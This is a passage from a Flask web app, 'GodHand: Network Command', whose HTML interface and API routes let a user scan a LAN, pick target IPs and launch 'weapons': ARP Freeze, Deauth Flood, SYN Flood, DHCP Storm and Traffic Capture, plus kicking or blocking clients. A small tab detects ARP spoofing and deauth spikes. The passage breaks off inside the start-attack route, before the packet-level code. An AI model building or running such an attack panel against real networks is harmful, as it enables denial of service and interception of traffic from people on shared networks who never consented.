.weapon-btn.active {
  border-color: var(--accent-primary);
  box-shadow: 0 0 0 2px var(--glow-accent);
}
.weapon-btn .num {
  font-size: 1.8rem;
  font-weight: 700;
  color: var(--accent-tertiary);
}
.weapon-btn .label {
  font-size: 0.8rem;
  color: var(--text-secondary);
}
.status-message {
  background: var(--bg-inset);
  border-radius: 8px;
  padding: 12px 16px;
  border-left: 4px solid var(--accent-primary);
  margin: 12px 0;
  font-size: 0.9rem;
}
.status-message.success { border-left-color: var(--success); }
.status-message.error { border-left-color: var(--danger); }
.table-responsive {
  overflow-x: auto;
  -webkit-overflow-scrolling: touch;
}
table {
  width: 100%;
  border-collapse: collapse;
  font-size: 0.9rem;
}
th {
  text-align: left;
  color: var(--text-secondary);
  font-weight: 500;
  font-size: 0.75rem;
  text-transform: uppercase;
  letter-spacing: 0.04em;
  padding: 12px 10px;
  border-bottom: 1px solid var(--border-subtle);
}
td {
  padding: 12px 10px;
  border-bottom: 1px solid var(--border-subtle);
}
tr:hover td { background: rgba(255,255,255,0.02); }
.badge {
  display: inline-flex;
  align-items: center;
  gap: 4px;
  padding: 4px 10px;
  border-radius: 20px;
  font-size: 0.7rem;
  font-weight: 600;
}
.badge.success { background: var(--glow-success); color: var(--success); }
.badge.warning { background: rgba(251,191,36,0.15); color: var(--warning); }
.badge.danger { background: var(--glow-danger); color: var(--danger); }
.badge.info { background: rgba(129,140,248,0.15); color: var(--info); }
.empty {
  color: var(--text-secondary);
  padding: 24px 0;
  text-align: center;
  font-size: 0.9rem;
}
.btn-icon {
  background: none;
  border: none;
  color: var(--text-secondary);
  cursor: pointer;
  padding: 8px;
  border-radius: 6px;
  font-size: 1.1rem;
  min-width: 40px;
  min-height: 40px;
}
.btn-icon:hover { background: var(--glow-accent); color: var(--accent-primary); }
.log-container {
  background: var(--bg-inset);
  border: 1px solid var(--border-subtle);
  border-radius: 8px;
  padding: 12px;
  max-height: 300px;
  overflow-y: auto;
  font-family: 'JetBrains Mono', monospace;
  font-size: 0.8rem;
}
.log-entry { padding: 4px 0; border-bottom: 1px solid rgba(255,255,255,0.03); display: flex; gap: 10px; }
.log-entry .time { color: var(--text-secondary); }
.log-entry .msg { flex: 1; }
.log-entry.error .msg { color: var(--danger); }
.log-entry.success .msg { color: var(--success); }
.log-entry.warn .msg { color: var(--warning); }
.modal-overlay {
  position: fixed;
  top: 0; left: 0; right: 0; bottom: 0;
  background: rgba(0,0,0,0.7);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 1000;
  backdrop-filter: blur(4px);
}
.modal {
  background: var(--bg-elevated);
  border-radius: var(--radius);
  padding: 24px;
  max-width: 400px;
  width: 90%;
  border: 1px solid var(--border-strong);
  box-shadow: var(--shadow);
}
.modal h3 { margin-bottom: 12px; }
.modal p { color: var(--text-secondary); margin-bottom: 20px; }
.toast-container {
  position: fixed;
  top: 20px;
  right: 20px;
  z-index: 2000;
  display: flex;
  flex-direction: column;
  gap: 10px;
}
.toast {
  background: var(--bg-elevated);
  border: 1px solid var(--border-strong);
  border-radius: 8px;
  padding: 12px 16px;
  display: flex;
  align-items: center;
  gap: 10px;
  box-shadow: var(--shadow);
  animation: slideIn 0.3s;
}
.toast.success { border-left: 4px solid var(--success); }
.toast.error { border-left: 4px solid var(--danger); }
.toast.warning { border-left: 4px solid var(--warning); }
@keyframes slideIn {
  from { transform: translateX(100%); opacity: 0; }
  to { transform: translateX(0); opacity: 1; }
}
@media (max-width: 768px) {
  nav {
    position: fixed;
    bottom: 0;
    left: 0;
    right: 0;
    top: auto;
    border-top: 1px solid var(--border-subtle);
    border-bottom: none;
    display: flex;
    justify-content: space-around;
    z-index: 100;
  }
  nav button {
    flex-direction: column;
    padding: 8px 4px;
    font-size: 0.7rem;
    border-bottom: none;
    border-top: 3px solid transparent;
    flex: 1;
  }
  nav button.active {
    border-top-color: var(--accent-primary);
    border-bottom: none;
  }
  main { padding-bottom: 80px; }
  .table-responsive {
    overflow-x: visible;
  }
  table, thead, tbody, th, td, tr {
    display: block;
  }
  thead tr { display: none; }
  tr {
    margin-bottom: 12px;
    border: 1px solid var(--border-subtle);
    border-radius: 8px;
    padding: 10px;
    background: var(--bg-elevated);
  }
  td {
    display: flex;
    justify-content: space-between;
    align-items: center;
    border-bottom: 1px solid rgba(255,255,255,0.05);
    padding: 8px 0;
  }
  td:last-child { border-bottom: none; }
  td::before {
    content: attr(data-label);
    font-weight: 600;
    color: var(--text-secondary);
    font-size: 0.7rem;
    text-transform: uppercase;
    letter-spacing: 0.04em;
    margin-right: 10px;
  }
}
</style>
</head>
<body>
<header>
  <a href="#" class="logo">
    <div class="logo-icon">G</div>
    <span>GodHand: Network Command</span>
  </a>
  <div class="status-indicator" id="global-status">
    <span class="status-dot" id="status-dot"></span>
    <span id="status-text">Ready</span>
  </div>
</header>

<nav id="main-nav">
  <button class="tab-btn active" data-tab="attacks"><span class="icon">🎯</span> Attacks</button>
  <button class="tab-btn" data-tab="targets"><span class="icon">📋</span> Targets</button>
  <button class="tab-btn" data-tab="hosts"><span class="icon">📡</span> Hosts</button>
  <button class="tab-btn" data-tab="devicewatch"><span class="icon">📊</span> Device Watch</button>
  <button class="tab-btn" data-tab="settings"><span class="icon">⚙️</span> Settings</button>
  <button class="tab-btn" data-tab="detector"><span class="icon">🛡️</span> Detector</button>
  <button class="tab-btn" data-tab="logs"><span class="icon">📜</span> Logs</button>
</nav>

<main>
  <div id="tab-attacks" class="tab-content active">
    <div class="card">
      <h2>Choose your weapon</h2>
      <p class="sub">Select an attack, set targets, then press Start.</p>
      <div class="weapon-grid" id="weapon-grid">
        <div class="weapon-btn active" data-w="1"><span class="num">1</span><span class="label">ARP Freeze</span></div>
        <div class="weapon-btn" data-w="2"><span class="num">2</span><span class="label">Deauth Flood</span></div>
        <div class="weapon-btn" data-w="3"><span class="num">3</span><span class="label">SYN Flood</span></div>
        <div class="weapon-btn" data-w="4"><span class="num">4</span><span class="label">DHCP Storm</span></div>
        <div class="weapon-btn" data-w="5"><span class="num">5</span><span class="label">Traffic Capture</span></div>
      </div>
      <div style="display:flex; gap:10px; flex-wrap:wrap;">
        <button class="btn big" id="start-btn" onclick="confirmStartAttack()">▶ Start</button>
        <button class="btn big secondary" id="stop-btn" onclick="confirmStopAttack()" disabled>⏹ Stop</button>
      </div>
      <div id="attack-status" class="status-message">Status: Ready</div>
    </div>
    <div class="card">
      <h2>Quick actions</h2>
      <div class="row">
        <button class="btn" onclick="kickSelected()">👢 Kick client</button>
        <button class="btn" onclick="toggleBlock()">🔒 Block/Unblock</button>
        <button class="btn secondary" onclick="refreshHosts()">🔄 Rescan LAN</button>
      </div>
    </div>
  </div>

  <div id="tab-targets" class="tab-content">
    <div class="card">
      <h2>Your targets</h2>
      <p class="sub">Add IPs from discovered hosts or type manually.</p>
      <div class="row">
        <input type="text" id="target-ip" placeholder="IP address">
        <button class="btn" onclick="addTarget()">Add</button>
      </div>
      <div class="table-responsive">
        <table id="target-table">
          <thead><tr><th>IP</th><th>MAC</th><th></th></tr></thead>
          <tbody id="target-body"></tbody>
        </table>
      </div>
      <div class="empty" id="target-empty">No targets added.</div>
    </div>
  </div>

  <div id="tab-hosts" class="tab-content">
    <div class="card">
      <h2>Discovered hosts</h2>
      <p class="sub">Scan the LAN to populate this list. Check boxes to bulk add.</p>
      <div class="row">
        <button class="btn" id="scan-btn" onclick="refreshHosts()">🔄 Scan now</button>
        <button class="btn secondary" onclick="bulkAddTargets()">Add selected to targets</button>
        <span id="scan-spinner" style="display:none;"><span class="spinner"></span> Scanning...</span>
      </div>
      <div class="table-responsive">
        <table id="host-table">
          <thead><tr><th><input type="checkbox" id="select-all-hosts" onchange="toggleAllHosts()"></th><th>IP</th><th>MAC</th><th>Reachability</th><th>Action</th></tr></thead>
          <tbody id="host-body"></tbody>
        </table>
      </div>
      <div class="empty" id="host-empty">No hosts discovered. Press "Scan now".</div>
    </div>
  </div>

  <div id="tab-devicewatch" class="tab-content">
    <div class="card">
      <h2>Add a device</h2>
      <p class="sub">Track hosts on your LAN. Server-side ping is used.</p>
      <div class="row">
        <input type="text" id="dev-name" placeholder="Label">
        <input type="text" id="dev-ip" placeholder="IP address">
        <button class="btn" onclick="addDevice()">Add</button>
      </div>
    </div>
    <div class="card">
      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
        <h2 style="margin:0;">Tracked devices</h2>
        <button class="btn secondary" onclick="checkAllDevices()">Check all</button>
      </div>
      <div class="table-responsive">
        <table id="dev-table">
          <thead><tr><th>Label</th><th>IP</th><th>Status</th><th>Latency</th><th></th></tr></thead>
          <tbody></tbody>
        </table>
      </div>
      <div class="empty" id="dev-empty">No devices yet. Add one above.</div>
    </div>
  </div>

  <div id="tab-settings" class="tab-content">
    <div class="card">
      <h2>Interface & gateway</h2>
      <p class="sub">Set your Wi‑Fi interface and gateway IP.</p>
      <div class="row">
        <select id="iface-select"></select>
        <button class="btn" onclick="setInterface()">Set interface</button>
      </div>
      <div class="row">
        <input type="text" id="gateway-input" placeholder="Gateway IP">
        <button class="btn" onclick="setGateway()">Set gateway</button>
      </div>
      <div class="row">
        <input type="number" id="port-input" placeholder="Port (1-65535)" value="80">
        <button class="btn" onclick="setPort()">Set port</button>
      </div>
      <div id="settings-status" class="status-message">Current: IFACE: none, GW: none, PORT: 80</div>
    </div>
  </div>

  <div id="tab-detector" class="tab-content">
    <div class="card">
      <h2>Paste an ARP snapshot</h2>
      <p class="sub">Run <code>arp -a</code> and paste output below. Detects MAC changes.</p>
      <textarea id="arp-input" placeholder="e.g. 192.168.1.1 aa:bb:cc:dd:ee:ff"></textarea>
      <div class="row" style="margin-top:10px;">
        <button class="btn" onclick="ingestArp()">Analyze snapshot</button>
        <button class="btn secondary" onclick="clearArpHistory()">Clear history</button>
      </div>
      <p class="sub" style="margin-top:10px;">Snapshots analyzed: <span id="arp-snap-count">0</span></p>
    </div>
    <div class="card">
      <h2>Paste deauth / frame-count log</h2>
      <p class="sub">Format: numbers separated by comma or newline.</p>
      <textarea id="deauth-input" placeholder="2,3,1,4,2,58,61,2,3"></textarea>
      <div class="row" style="margin-top:10px;">
        <button class="btn" onclick="analyzeDeauth()">Analyze log</button>
      </div>
    </div>
    <div class="card">
      <h2>Alerts</h2>
      <div id="alerts"></div>
      <div class="empty" id="alerts-empty">No anomalies detected yet.</div>
    </div>
  </div>

  <div id="tab-logs" class="tab-content">
    <div class="card">
      <h2>Activity log (server-side)</h2>
      <p class="sub">All actions are logged on the server.</p>
      <button class="btn secondary" onclick="clearServerLogs()">Clear server log</button>
      <div class="log-container" id="log-container"></div>
    </div>
  </div>
</main>

<div id="modal-overlay" class="modal-overlay" style="display:none;">
  <div class="modal">
    <h3 id="modal-title">Confirm</h3>
    <p id="modal-message"></p>
    <div style="display:flex; gap:10px; justify-content:flex-end;">
      <button class="btn secondary" onclick="closeModal()">Cancel</button>
      <button class="btn danger" id="modal-confirm-btn" onclick="confirmModalAction()">Confirm</button>
    </div>
  </div>
</div>

<div class="toast-container" id="toast-container"></div>

<script>
// Global state
let selectedWeapon = 1;
let currentTargets = [];
let currentHosts = [];
let attackRunning = {};   // weapon_id -> true/false
let devices = JSON.parse(localStorage.getItem('lg_devices') || '[]');
let arpHistory = JSON.parse(localStorage.getItem('lg_arp_history') || '[]');
let alerts = JSON.parse(localStorage.getItem('lg_alerts') || '[]');
let authToken = localStorage.getItem('godhand_token') || '';
let modalAction = null;

// Helper: API call
async function apiCall(endpoint, method='GET', data=null) {
  const headers = {'Content-Type': 'application/json'};
  if (authToken) headers['Authorization'] = 'Bearer ' + authToken;
  const opts = { method, headers };
  if (data) opts.body = JSON.stringify(data);
  const res = await fetch('/api/' + endpoint, opts);
  if (res.status === 401) {
    // Prompt for token
    const token = prompt('Enter access token:');
    if (token) {
      authToken = token;
      localStorage.setItem('godhand_token', token);
      return apiCall(endpoint, method, data);
    }
    throw new Error('Unauthorized');
  }
  return res.json();
}

// Toasts
function showToast(message, type='success') {
  const container = document.getElementById('toast-container');
  const toast = document.createElement('div');
  toast.className = 'toast ' + type;
  toast.textContent = message;
  container.appendChild(toast);
  setTimeout(() => toast.remove(), 4000);
}

// Modal
function openModal(title, message, action) {
  document.getElementById('modal-title').textContent = title;
  document.getElementById('modal-message').textContent = message;
  modalAction = action;
  document.getElementById('modal-overlay').style.display = 'flex';
}
function closeModal() {
  document.getElementById('modal-overlay').style.display = 'none';
  modalAction = null;
}
function confirmModalAction() {
  if (modalAction) modalAction();
  closeModal();
}

// Tabs
document.querySelectorAll('.tab-btn').forEach(btn => {
  btn.addEventListener('click', () => {
    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
    btn.classList.add('active');
    document.getElementById('tab-' + btn.dataset.tab).classList.add('active');
  });
});

// Weapon selection
document.querySelectorAll('.weapon-btn').forEach(el => {
  el.addEventListener('click', () => {
    document.querySelectorAll('.weapon-btn').forEach(b => b.classList.remove('active'));
    el.classList.add('active');
    selectedWeapon = parseInt(el.dataset.w, 10);
  });
});

// Global status
function updateGlobalStatus(text, running=false) {
  document.getElementById('status-text').textContent = text;
  const dot = document.getElementById('status-dot');
  dot.className = 'status-dot' + (running ? ' running' : '');
}

// Poll logs
async function pollLogs() {
  try {
    const data = await apiCall('logs');
    const container = document.getElementById('log-container');
    container.innerHTML = '';
    data.logs.slice(-100).forEach(entry => {
      const div = document.createElement('div');
      div.className = 'log-entry ' + entry.level;
      div.innerHTML = `<span class="time">[${entry.time}]</span><span class="msg">${entry.msg}</span>`;
      container.appendChild(div);
    });
    container.scrollTop = container.scrollHeight;
  } catch(e) {}
}
function clearServerLogs() {
  apiCall('clear_logs', 'POST').then(pollLogs);
}

// Poll attack status
async function pollAttackStatus() {
  try {
    const data = await apiCall('attack_status');
    attackRunning = data.attacks;
    const anyRunning = Object.values(attackRunning).some(v => v);
    document.getElementById('start-btn').disabled = anyRunning;
    document.getElementById('stop-btn').disabled = !anyRunning;
    if (anyRunning) {
      const weapons = Object.keys(attackRunning).filter(k => attackRunning[k]);
      updateGlobalStatus('Running: ' + weapons.join(', '), true);
    } else {
      updateGlobalStatus('Ready');
    }
  } catch(e) {}
}

// Prerequisites
async function checkPrerequisites() {
  try {
    const state = await apiCall('state');
    const s = state.state;
    document.getElementById('settings-status').textContent =
      `Current: IFACE: ${s.interface || 'none'}, GW: ${s.gateway || 'none'}, PORT: ${s.port}`;
  } catch(e) {}
}

// Interface loading
async function loadInterfaces() {
  try {
    const data = await apiCall('interfaces');
    const sel = document.getElementById('iface-select');
    sel.innerHTML = '';
    data.interfaces.forEach(iface => {
      const opt = document.createElement('option');
      opt.value = iface.name;
      let label = iface.name;
      if (iface.ip) label += ' (' + iface.ip + ')';
      if (iface.wireless) label += ' 📶';
      opt.textContent = label;
      sel.appendChild(opt);
    });
    if (data.interfaces.length > 0) {
      const selected = data.interfaces.find(i => i.ip && i.wireless) || data.interfaces.find(i => i.ip) || data.interfaces[0];
      sel.value = selected.name;
      await setInterface();
    }
  } catch(e) {}
}

async function setInterface() {
  const iface = document.getElementById('iface-select').value;
  if (!iface) return;
  const res = await apiCall('set_interface', 'POST', { interface: iface });
  showToast(res.status, res.success ? 'success' : 'error');
  checkPrerequisites();
}
async function setGateway() {
  const gw = document.getElementById('gateway-input').value.trim();
  if (!gw) return;
  const res = await apiCall('set_gateway', 'POST', { gateway: gw });
  showToast(res.status, res.success ? 'success' : 'error');
  checkPrerequisites();
}
async function setPort() {
  const port = parseInt(document.getElementById('port-input').value, 10);
  if (isNaN(port) || port<1 || port>65535) return;
  const res = await apiCall('set_port', 'POST', { port });
  showToast(res.status, res.success ? 'success' : 'error');
  checkPrerequisites();
}

// Hosts
async function refreshHosts() {
  const scanBtn = document.getElementById('scan-btn');
  const spinner = document.getElementById('scan-spinner');
  scanBtn.disabled = true;
  spinner.style.display = 'inline-block';
  const res = await apiCall('scan');
  scanBtn.disabled = false;
  spinner.style.display = 'none';
  if (res.success) {
    currentHosts = res.hosts;
    renderHosts();
  } else {
    showToast('Scan failed: ' + res.error, 'error');
  }
}

function renderHosts() {
  const tbody = document.getElementById('host-body');
  const empty = document.getElementById('host-empty');
  tbody.innerHTML = '';
  empty.style.display = currentHosts.length ? 'none' : 'block';
  currentHosts.forEach(h => {
    const isTarget = currentTargets.includes(h.ip);
    const tr = document.createElement('tr');
    tr.innerHTML = `
      <td data-label=""><input type="checkbox" class="host-check" data-ip="${h.ip}"></td>
      <td data-label="IP">${h.ip}${isTarget ? ' <span class="badge success">Target</span>' : ''}</td>
      <td data-label="MAC">${h.mac}</td>
      <td data-label="Reachability" id="reach-${h.ip}"><span class="badge info">Checking...</span></td>
      <td data-label="Action">
        ${isTarget 
          ? `<button class="btn-icon" onclick="removeTargetByIP('${h.ip}')" title="Remove target">✕</button>`
          : `<button class="btn-icon" onclick="addTargetByIP('${h.ip}')" title="Add target">＋</button>`}
        <button class="btn-icon" onclick="kickIP('${h.ip}')" title="Kick">👢</button>
        <button class="btn-icon" onclick="toggleBlockIP('${h.ip}')" title="Block">🔒</button>
      </td>
    `;
    tbody.appendChild(tr);
    serverCheckReachability(h.ip);
  });
}

async function serverCheckReachability(ip) {
  const cell = document.getElementById('reach-' + ip);
  if (!cell) return;
  const res = await apiCall('check_reachability?ip=' + encodeURIComponent(ip));
  if (res.reachable) {
    cell.innerHTML = `<span class="badge success">Reachable (${res.latency}ms)</span>`;
  } else {
    cell.innerHTML = `<span class="badge danger">No response</span>`;
  }
}

function toggleAllHosts() {
  const checked = document.getElementById('select-all-hosts').checked;
  document.querySelectorAll('.host-check').forEach(cb => cb.checked = checked);
}

async function bulkAddTargets() {
  const selectedIPs = Array.from(document.querySelectorAll('.host-check:checked')).map(cb => cb.dataset.ip);
  if (!selectedIPs.length) {
    showToast('No hosts selected', 'warning');
    return;
  }
  await Promise.all(selectedIPs.map(ip => addTargetByIP(ip, false)));
  loadTargets();
  renderHosts();
  showToast('Targets added', 'success');
}

// Targets
async function addTargetByIP(ip, refresh = true) {
  const res = await apiCall('add_target', 'POST', { ip });
  if (res.success) {
    showToast('Added target ' + ip, 'success');
    if (refresh) {
      loadTargets();
      renderHosts();
    }
  } else {
    showToast('Error: ' + res.error, 'error');
  }
}
async function removeTargetByIP(ip) {
  const res = await apiCall('remove_target', 'POST', { ip });
  if (res.success) {
    showToast('Removed target ' + ip, 'success');
    loadTargets();
    renderHosts();
  }
}
async function addTarget() {
  const ip = document.getElementById('target-ip').value.trim();
  if (!ip) return;
  await addTargetByIP(ip);
  document.getElementById('target-ip').value = '';
}
async function loadTargets() {
  const res = await apiCall('state');
  currentTargets = res.state.targets || [];
  const tbody = document.getElementById('target-body');
  const empty = document.getElementById('target-empty');
  tbody.innerHTML = '';
  empty.style.display = currentTargets.length ? 'none' : 'block';
  currentTargets.forEach(ip => {
    const host = currentHosts.find(h => h.ip === ip);
    const mac = host ? host.mac : '—';
    const tr = document.createElement('tr');
    tr.innerHTML = `
      <td data-label="IP">${ip}</td>
      <td data-label="MAC">${mac}</td>
      <td data-label=""><button class="btn-icon" onclick="removeTargetByIP('${ip}')">✕</button></td>
    `;
    tbody.appendChild(tr);
  });
}

// Attacks
async function confirmStartAttack() {
  const state = await apiCall('state');
  if (!state.state.interface) {
    showToast('Interface not set. Go to Settings.', 'error');
    return;
  }
  if (state.running_attacks.length > 0) {
    showToast('An attack is already running.', 'warning');
    return;
  }
  openModal('Start Attack', `Start weapon ${selectedWeapon}?`, async () => {
    const btn = document.getElementById('start-btn');
    btn.disabled = true;
    btn.textContent = 'Starting...';
    const res = await apiCall('start_attack', 'POST', { weapon: selectedWeapon });
    btn.disabled = false;
    btn.textContent = '▶ Start';
    if (res.success) {
      showToast('Attack started: ' + res.weapon, 'success');
      pollAttackStatus();
    } else {
      showToast('Failed: ' + res.error, 'error');
    }
  });
}
async function confirmStopAttack() {
  openModal('Stop Attack', 'Stop all running attacks?', async () => {
    const res = await apiCall('stop_attack', 'POST');
    showToast(res.status, res.success ? 'success' : 'error');
    pollAttackStatus();
  });
}

// Kick/Block
async function kickIP(ip) {
  openModal('Kick Client', `Kick ${ip}?`, async () => {
    const res = await apiCall('kick', 'POST', { ip });
    showToast(res.status, res.success ? 'success' : 'error');
  });
}
async function toggleBlockIP(ip) {
  const res = await apiCall('block', 'POST', { ip });
  showToast(res.status, res.success ? 'success' : 'error');
}
function kickSelected() {
  const ip = prompt('Enter IP to kick:');
  if (ip) kickIP(ip);
}
function toggleBlock() {
  const ip = prompt('Enter IP to block/unblock:');
  if (ip) toggleBlockIP(ip);
}

// Device Watch
function renderDevices() {
  const tbody = document.querySelector('#dev-table tbody');
  const empty = document.getElementById('dev-empty');
  tbody.innerHTML = '';
  empty.style.display = devices.length ? 'none' : 'block';
  devices.forEach((d, i) => {
    const tr = document.createElement('tr');
    let badge = '<span class="badge info">Not checked</span>';
    if (d.status === 'up') badge = '<span class="badge success">Reachable</span>';
    else if (d.status === 'down') badge = '<span class="badge danger">No response</span>';
    else if (d.status === 'checking') badge = '<span class="badge warning">Checking...</span>';
    tr.innerHTML = `
      <td data-label="Label">${d.name || '—'}</td>
      <td data-label="IP">${d.ip}</td>
      <td data-label="Status">${badge}</td>
      <td data-label="Latency">${d.latency ? d.latency + ' ms' : '—'}</td>
      <td data-label="">
        <button class="btn-icon" onclick="checkDevice(${i})">↻</button>
        <button class="btn-icon" onclick="removeDevice(${i})">✕</button>
      </td>
    `;
    tbody.appendChild(tr);
  });
}
function addDevice() {
  const name = document.getElementById('dev-name').value.trim();
  const ip = document.getElementById('dev-ip').value.trim();
  if (!ip.match(/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/)) {
    showToast('Invalid IP', 'error');
    return;
  }
  devices.push({ name, ip, status: null, latency: null });
  localStorage.setItem('lg_devices', JSON.stringify(devices));
  document.getElementById('dev-name').value = '';
  document.getElementById('dev-ip').value = '';
  renderDevices();
}
function removeDevice(i) {
  devices.splice(i, 1);
  localStorage.setItem('lg_devices', JSON.stringify(devices));
  renderDevices();
}
async function checkDevice(i) {
  const d = devices[i];
  d.status = 'checking';
  renderDevices();
  const res = await apiCall('check_reachability?ip=' + encodeURIComponent(d.ip));
  if (res.reachable) {
    d.latency = res.latency;
    d.status = 'up';
  } else {
    d.status = 'down';
    d.latency = null;
  }
  localStorage.setItem('lg_devices', JSON.stringify(devices));
  renderDevices();
}
function checkAllDevices() {
  devices.forEach((_, i) => checkDevice(i));
}

// ARP Detector
function parseArpText(text) {
  const entries = {};
  const lines = text.split('\n');
  const ipRe = /(\d{1,3}(?:\.\d{1,3}){3})/;
  const macRe = /([0-9a-fA-F]{2}[:-]){5}[0-9a-fA-F]{2}/;
  lines.forEach(line => {
    const ipm = line.match(ipRe);
    const macm = line.match(macRe);
    if (ipm && macm) {
      const ip = ipm[1];
      const mac = macm[0].toLowerCase().replace(/-/g, ':');
      entries[ip] = mac;
    }
  });
  return entries;
}
function ingestArp() {
  const text = document.getElementById('arp-input').value;
  const entries = parseArpText(text);
  if (Object.keys(entries).length === 0) {
    pushAlert("Couldn't parse any IP/MAC pairs from that input.", 'warn');
    renderAlerts();
    return;
  }
  const snapshot = { time: new Date().toISOString(), entries };
  if (arpHistory.length > 0) {
    const prev = arpHistory[arpHistory.length - 1];
    Object.keys(entries).forEach(ip => {
      if (prev.entries[ip] && prev.entries[ip] !== entries[ip]) {
        pushAlert(`IP ${ip} changed MAC address: ${prev.entries[ip]} → ${entries[ip]}. Could be legit or ARP spoofing.`, 'bad');
      }
    });
    const macToIps = {};
    Object.entries(entries).forEach(([ip, mac]) => {
      macToIps[mac] = macToIps[mac] || [];
      macToIps[mac].push(ip);
    });
    Object.entries(macToIps).forEach(([mac, ips]) => {
      if (ips.length > 1) {
        pushAlert(`MAC ${mac} is claiming multiple IPs: ${ips.join(', ')}. ARP spoofing likely.`, 'bad');
      }
    });
  }
  arpHistory.push(snapshot);
  localStorage.setItem('lg_arp_history', JSON.stringify(arpHistory));
  document.getElementById('arp-snap-count').textContent = arpHistory.length;
  renderAlerts();
}
function clearArpHistory() {
  arpHistory = [];
  localStorage.setItem('lg_arp_history', JSON.stringify(arpHistory));
  document.getElementById('arp-snap-count').textContent = 0;
}
function analyzeDeauth() {
  const text = document.getElementById('deauth-input').value.trim();
  if (!text) return;
  const nums = text.split(/[\n,]+/).map(s => parseFloat(s.trim())).filter(n => !isNaN(n));
  if (nums.length < 3) {
    pushAlert('Need at least a few readings.', 'warn');
    renderAlerts();
    return;
  }
  const mean = nums.reduce((a, b) => a + b, 0) / nums.length;
  const std = Math.sqrt(nums.reduce((a, b) => a + (b - mean) ** 2, 0) / nums.length) || 1;
  nums.forEach((n, i) => {
    if (n > mean + 3 * std && n > 10) {
      pushAlert(`Reading #${i + 1} (value ${n}) is a major spike above baseline.`, 'bad');
    }
  });
  renderAlerts();
}
function pushAlert(msg, level) {
  alerts.unshift({ msg, level, time: new Date().toLocaleString() });
  alerts = alerts.slice(0, 50);
  localStorage.setItem('lg_alerts', JSON.stringify(alerts));
  apiCall('add_log', 'POST', { level: level === 'bad' ? 'error' : 'warn', msg });
}
function renderAlerts() {
  const box = document.getElementById('alerts');
  const empty = document.getElementById('alerts-empty');
  box.innerHTML = '';
  empty.style.display = alerts.length ? 'none' : 'block';
  alerts.forEach(a => {
    const div = document.createElement('div');
    div.className = 'alert-item ' + (a.level === 'warn' ? 'warn' : '');
    div.innerHTML = `${a.msg}<div class="t">${a.time}</div>`;
    box.appendChild(div);
  });
}

// Init
document.getElementById('arp-snap-count').textContent = arpHistory.length;
renderDevices();
renderAlerts();
loadInterfaces();
loadTargets();
checkPrerequisites();
pollLogs();
pollAttackStatus();
setInterval(pollLogs, 2000);
setInterval(pollAttackStatus, 2000);
</script>
</body>
</html>
'''
    return render_template_string(html_template)

# ---------- API endpoints (with authentication) ----------
@app.route('/api/interfaces', methods=['GET'])
@require_auth
def api_interfaces():
    try:
        out = subprocess.check_output(['ip', '-o', 'link', 'show'], text=True)
        iface_list = []
        for line in out.splitlines():
            parts = line.split(':')
            if len(parts) >= 2:
                name = parts[1].strip()
                if name == 'lo':
                    continue
                ip = ''
                try:
                    ip_out = subprocess.check_output(['ip', '-o', '-4', 'addr', 'show', name], text=True)
                    for l in ip_out.splitlines():
                        if 'inet ' in l:
                            ip = l.split()[3].split('/')[0]
                            break
                except:
                    pass
                wireless = False
                try:
                    subprocess.check_output(['iw', 'dev', name, 'info'], stderr=subprocess.DEVNULL, text=True)
                    wireless = True
                except:
                    pass
                iface_list.append({'name': name, 'ip': ip, 'wireless': wireless})
        return jsonify({'interfaces': iface_list})
    except Exception as e:
        return jsonify({'interfaces': [], 'error': str(e)})

@app.route('/api/set_interface', methods=['POST'])
@require_auth
def api_set_interface():
    data = request.json
    iface = data.get('interface')
    if not iface:
        return jsonify({'success': False, 'status': 'No interface provided'})
    update_state('interface', iface)
    add_log('info', f'Interface set to {iface}')
    return jsonify({'success': True, 'status': f'Interface set to {iface}'})

@app.route('/api/set_gateway', methods=['POST'])
@require_auth
def api_set_gateway():
    data = request.json
    gw = data.get('gateway')
    if not gw or not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', gw):
        return jsonify({'success': False, 'status': 'Invalid IP'})
    update_state('gateway', gw)
    add_log('info', f'Gateway set to {gw}')
    return jsonify({'success': True, 'status': f'Gateway set to {gw}'})

@app.route('/api/set_port', methods=['POST'])
@require_auth
def api_set_port():
    data = request.json
    port = data.get('port')
    try:
        port = int(port)
    except:
        return jsonify({'success': False, 'status': 'Invalid port'})
    if port < 1 or port > 65535:
        return jsonify({'success': False, 'status': 'Invalid port'})
    update_state('port', port)
    add_log('info', f'Port set to {port}')
    return jsonify({'success': True, 'status': f'Port set to {port}'})

@app.route('/api/state', methods=['GET'])
@require_auth
def api_state():
    with STATE_LOCK:
        return jsonify({
            'state': {
                'interface': STATE['interface'],
                'gateway': STATE['gateway'],
                'port': STATE['port'],
                'targets': STATE['targets'],
                'hosts': STATE['hosts'],
                'blocked_macs': list(STATE['blocked_macs']),
            },
            'running_attacks': list(STATE['attack_pids'].keys())
        })

@app.route('/api/scan', methods=['GET'])
@require_auth
def api_scan():
    iface = get_state('interface')
    if not iface:
        return jsonify({'success': False, 'error': 'Interface not set'})
    my_ip, cidr = get_my_ip_and_cidr(iface)
    if my_ip == '0.0.0.0':
        return jsonify({'success': False, 'error': 'No IP on interface'})
    hosts = arp_scan(iface, my_ip, cidr)
    update_state('hosts', hosts)
    add_log('info', f'ARP scan completed, found {len(hosts)} hosts')
    return jsonify({'success': True, 'hosts': hosts})

@app.route('/api/add_target', methods=['POST'])
@require_auth
def api_add_target():
    data = request.json
    ip = data.get('ip')
    if not ip or not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip):
        return jsonify({'success': False, 'error': 'Invalid IP'})
    if ip not in STATE['targets']:
        add_to_list('targets', ip)
        add_log('info', f'Target added: {ip}')
    return jsonify({'success': True})

@app.route('/api/remove_target', methods=['POST'])
@require_auth
def api_remove_target():
    data = request.json
    ip = data.get('ip')
    if ip in STATE['targets']:
        remove_from_list('targets', ip)
        add_log('info', f'Target removed: {ip}')
    return jsonify({'success': True})

@app.route('/api/start_attack', methods=['POST'])
@require_auth
def api_start_attack():
    data = request.json
    weapon = data.get('weapon')
    if weapon not in [1,2,3,4,5]:
        return jsonify({'success': False, 'error': 'Invalid weapon'})
    if not STATE['interface']:
        return jsonify({'success': False, 'error': 'Interface not set'})
    if not STATE['targets']:
        return jsonify({'success': False, 'error': 'No targets added'})
    if weapon != 5 and not STATE['gateway']:
